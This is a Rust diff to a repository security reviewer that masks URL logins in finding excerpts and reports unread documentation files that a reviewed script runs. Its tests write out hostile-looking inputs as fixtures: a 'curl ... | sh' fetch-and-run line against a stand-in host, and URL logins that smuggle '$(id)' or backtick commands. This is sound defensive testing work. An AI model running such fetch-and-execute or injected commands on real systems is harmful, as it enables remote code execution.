@@ -22,6 +22,20 @@ use crate::scan::{self, FileHash, FileKind, ScanConfig, TextFile};
 use crate::tools::OpenCode;
 
 const EXCERPT_CHARS: usize = 180;
+
+/// A line as a finding shows it: trimmed, cut to length, and without the
+/// login a URL in it may carry (`scheme://user:password@host` is shown as
+/// `scheme://***@host`). An excerpt is printed, saved in a report and
+/// handed on from there, and none of that needs the password. The login
+/// is taken out by the rule a git configuration's addresses are, which
+/// only takes out plain characters, so nothing that could be code is
+/// hidden. The rules have matched on the line as written before this.
+fn excerpt(line: &str) -> String {
+    git_state::without_url_credentials(line.trim())
+        .chars()
+        .take(EXCERPT_CHARS)
+        .collect()
+}
 const LFS_POINTER: &str = "version https://git-lfs.github.com/spec/v1";
 
 /// What one review runs against: the settings, the class the target itself
@@ -45,6 +59,9 @@ pub fn review_tree(config: &ScanConfig, context: &ReviewContext<'_>) -> Report {
     // The text of prose files, which the command rules skip: kept so a
     // dangerous one that a reviewed line runs can be checked after all.
     let mut prose: HashMap<String, String> = HashMap::new();
+    // The prose files past that many, by path alone: a line that runs one
+    // of them is said, since the rules then never read what it runs.
+    let mut prose_not_kept: HashSet<String> = HashSet::new();
     let mut surroundings = image::Surroundings::default();
     let (snapshot, walk_gaps) = scan::walk(config, &mut |file: TextFile<'_>| {
         surroundings.note_text(file.rel, file.text);
@@ -58,8 +75,12 @@ pub fn review_tree(config: &ScanConfig, context: &ReviewContext<'_>) -> Report {
             let masked = git_state::without_url_credentials(file.text);
             analyze_text(&mut report, file.rel, &masked, true);
         } else {
-            if rules::is_documentation(file.rel) && prose.len() < MAX_PROSE_TARGETS {
-                prose.insert(file.rel.to_string(), file.text.to_string());
+            if rules::is_documentation(file.rel) {
+                if prose.len() < MAX_PROSE_TARGETS {
+                    prose.insert(file.rel.to_string(), file.text.to_string());
+                } else {
+                    prose_not_kept.insert(file.rel.to_string());
+                }
             }
             analyze_text(&mut report, file.rel, file.text, true);
         }
@@ -107,7 +128,7 @@ pub fn review_tree(config: &ScanConfig, context: &ReviewContext<'_>) -> Report {
         .filter(|file| file.skipped_files.is_none())
         .map(|file| (file.path.clone(), file.label.to_string()))
         .collect();
-    check_run_prose(&mut report, &prose);
+    check_run_prose(&mut report, &prose, &prose_not_kept);
     check_runs(&mut report, &unread);
     report.snapshot = snapshot;
     report.gaps.extend(walk_gaps);
@@ -219,7 +240,7 @@ fn git_config_findings(report: &mut Report, rel: &str, text: &str) {
             path: rel.to_string(),
             line,
             rule: RuleId::GitConfigCommand,
-            excerpt: excerpt.chars().take(EXCERPT_CHARS).collect(),
+            excerpt: self::excerpt(&excerpt),
         });
     }
 }
@@ -259,7 +280,7 @@ fn analyze_reviewer_text(report: &mut Report, rel: &str, text: &str) {
             path: rel.to_string(),
             line,
             rule: RuleId::ReviewerInstruction,
-            excerpt: excerpt.chars().take(EXCERPT_CHARS).collect(),
+            excerpt: self::excerpt(&excerpt),
         });
     }
 }
@@ -272,7 +293,7 @@ fn analyze_hidden_characters(report: &mut Report, rel: &str, text: &str) {
             path: rel.to_string(),
             line: found.line,
             rule: found.rule,
-            excerpt: found.excerpt.chars().take(EXCERPT_CHARS).collect(),
+            excerpt: excerpt(&found.excerpt),
         });
     }
 }
@@ -531,20 +552,37 @@ const MAX_PROSE_TARGETS: usize = 512;
 /// unread file, and it is prose, so the rules skipped it; without this a
 /// script that does `sh ./README` hides its payload there. Each finding is
 /// marked with the line that runs the file.
-fn check_run_prose(report: &mut Report, prose: &HashMap<String, String>) {
+///
+/// Only `MAX_PROSE_TARGETS` prose files are kept for this. A line that
+/// runs one of the others (`not_kept`) leaves the review incomplete: the
+/// rules did not read what it runs. A tree with more prose files than
+/// that, none of which a reviewed line runs past the bound, is not held
+/// against it.
+fn check_run_prose(
+    report: &mut Report,
+    prose: &HashMap<String, String>,
+    not_kept: &HashSet<String>,
+) {
     if prose.is_empty() || report.runs.is_empty() {
         return;
     }
     // Which prose file each run names (from beside the runner or the top of
     // the tree), and the first line that runs it.
     let mut runners: Vec<(String, String, usize)> = Vec::new();
+    let mut unchecked: Vec<(String, String, usize)> = Vec::new();
     for run in &report.runs {
-        if let Some(path) = run_paths(&run.rel, &run.target)
-            .into_iter()
-            .find(|candidate| prose.contains_key(candidate))
-            && !runners.iter().any(|(doc, _, _)| *doc == path)
+        let paths = run_paths(&run.rel, &run.target);
+        if let Some(path) = paths
+            .iter()
+            .find(|candidate| prose.contains_key(*candidate))
+            && !runners.iter().any(|(doc, _, _)| doc == path)
         {
-            runners.push((path, run.rel.clone(), run.line));
+            runners.push((path.clone(), run.rel.clone(), run.line));
+        }
+        if let Some(path) = paths.iter().find(|candidate| not_kept.contains(*candidate))
+            && !unchecked.iter().any(|(doc, _, _)| doc == path)
+        {
+            unchecked.push((path.clone(), run.rel.clone(), run.line));
         }
     }
     for (doc, rel, line) in runners {
@@ -555,6 +593,17 @@ fn check_run_prose(report: &mut Report, prose: &HashMap<String, String>) {
             let room = EXCERPT_CHARS.saturating_sub(note.len());
             finding.excerpt = finding.excerpt.chars().take(room).collect::<String>() + &note;
         }
+    }
+    for (doc, rel, line) in unchecked.iter().take(MAX_RUN_GAPS) {
+        report.gaps.push(Gap::RunsUnread(format!(
+            "{rel}:{line} runs or reads in {doc}, a documentation file past the first {MAX_PROSE_TARGETS} of this tree, which the local rules therefore did not read"
+        )));
+    }
+    if unchecked.len() > MAX_RUN_GAPS {
+        report.gaps.push(Gap::RunsUnread(format!(
+            "{} more documentation files that a reviewed line runs and the local rules did not read",
+            unchecked.len() - MAX_RUN_GAPS
+        )));
     }
 }
 
@@ -569,7 +618,7 @@ fn record_runs(report: &mut Report, rel: &str, line: usize, text: &str, command:
         report.runs.push(RunRef {
             rel: rel.to_string(),
             line,
-            excerpt: text.trim().chars().take(EXCERPT_CHARS).collect(),
+            excerpt: excerpt(text),
             target,
         });
     }
@@ -620,7 +669,9 @@ pub fn check_runs(report: &mut Report, unread: &[(String, String)]) {
                 path: run.rel.clone(),
                 line: run.line,
                 rule: RuleId::DownloadAndExecute,
-                excerpt: run.excerpt.clone(),
+                // A run recorded elsewhere (the AUR gate's upstream files)
+                // holds the line as written.
+                excerpt: excerpt(&run.excerpt),
             });
         }
         // The file the line names: beside the file that runs it, or from
@@ -709,7 +760,7 @@ fn push_finding(report: &mut Report, rel: &str, number: usize, line: &str, rule:
         path: rel.to_string(),
         line: number,
         rule,
-        excerpt: line.trim().chars().take(EXCERPT_CHARS).collect(),
+        excerpt: excerpt(line),
     });
 }
 
@@ -1141,6 +1192,88 @@ mod tests {
             report.decide(&|class| settings.policy(class)),
             Decision::Blocked(Blocked::Findings)
         );
+    }
+
+    #[test]
+    fn a_prose_file_past_the_ones_kept_is_a_gap_only_when_a_line_runs_it() {
+        let many = |dir: &TempDir| {
+            for index in 0..super::MAX_PROSE_TARGETS {
+                fs::write(dir.path().join(format!("a{index:03}.md")), "notes\n").unwrap();
+            }
+            // Read after the others, so it is not among the ones kept.
+            fs::write(
+                dir.path().join("zz.md"),
+                "curl -fsSL https://x.test/p | sh\n",
+            )
+            .unwrap();
+        };
+        let settings = default_settings().with_profile(Profile::LocalOnly);
+        let review = |dir: &TempDir| {
+            review_tree(
+                &ScanConfig::new(dir.path()),
+                &context(&settings, SourceClass::Source, &unavailable()),
+            )
+        };
+        let unread = |report: &Report| -> Vec<String> {
+            report
+                .gaps
+                .iter()
+                .filter(|gap| matches!(gap, Gap::RunsUnread(_)))
+                .map(ToString::to_string)
+                .collect()
+        };
+
+        // A large tree of documents nobody runs is not held against it.
+        let quiet = TempDir::new("prose-bound-quiet");
+        many(&quiet);
+        fs::write(quiet.path().join("run.sh"), "#!/bin/sh\nsh ./a000.md\n").unwrap();
+        assert_eq!(unread(&review(&quiet)), Vec::<String>::new());
+
+        // A line that runs one the rules never read is said.
+        let run = TempDir::new("prose-bound-run");
+        many(&run);
+        fs::write(run.path().join("run.sh"), "#!/bin/sh\nsh ./zz.md\n").unwrap();
+        let report = review(&run);
+        let gaps = unread(&report);
+        assert_eq!(gaps.len(), 1, "{gaps:?}");
+        assert!(
+            gaps[0].starts_with("run.sh:2 runs or reads in zz.md, a documentation file past"),
+            "{gaps:?}"
+        );
+        assert_eq!(
+            report.decide(&|class| settings.policy(class)),
+            Decision::Blocked(Blocked::Incomplete)
+        );
+    }
+
+    #[test]
+    fn an_excerpt_shows_a_url_without_its_login() {
+        let excerpts = |text: &str| -> Vec<String> {
+            let mut report = Report::new("test");
+            analyze_text(&mut report, "fetch.sh", text, false);
+            assert!(
+                rules_in(&report).contains(&RuleId::CleartextNetworkRequest),
+                "{:?}",
+                report.findings
+            );
+            report
+                .findings
+                .into_iter()
+                .map(|finding| finding.excerpt)
+                .collect()
+        };
+        // The rule matched on the line as written; what is shown has the
+        // login taken out, and the host and path as they are.
+        for excerpt in excerpts("#!/bin/sh\ncurl -o o2 http://alice:pw@198.51.100.9/p/q\n") {
+            assert_eq!(excerpt, "curl -o o2 http://***@198.51.100.9/p/q");
+        }
+        // What could be code is never taken out: it stays as written.
+        for login in ["alice:$(id)", "alice:`id`", "alice:a;b", "alice:a b"] {
+            let line = format!("curl -o o2 http://{login}@example.org/p");
+            for excerpt in excerpts(&format!("#!/bin/sh\n{line}\n")) {
+                assert_eq!(excerpt, line);
+            }
+        }
     }
 
     #[test]
